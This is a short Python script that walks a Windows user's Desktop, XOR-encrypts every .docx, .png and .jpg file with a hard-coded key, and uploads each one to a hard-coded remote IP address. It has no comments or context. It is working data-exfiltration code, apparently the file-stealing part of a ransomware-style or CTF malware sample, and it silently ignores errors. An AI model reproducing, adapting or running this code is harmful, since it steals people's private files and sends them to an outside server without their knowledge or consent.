import os
import requests

key = "G0G0Squ1d3Ncrypt10n"
server = "http://34.134.77.90:8080/upload"

def xor_file(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)

base_path = r"C:\Users\squid\Desktop"
extensions = ['.docx', '.png', ".jpeg", ".jpg"]

for root, dirs, files in os.walk(base_path):
    for file in files:
        if any(file.endswith(ext) for ext in extensions):
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'rb') as f:
                    content = f.read()
                
                encrypted = xor_file(content, key)
                hex_data = encrypted.hex()
                requests.post(server, files={'file': (file, hex_data)})
                
                print(f"Sent: {file}")
            except:
                pass
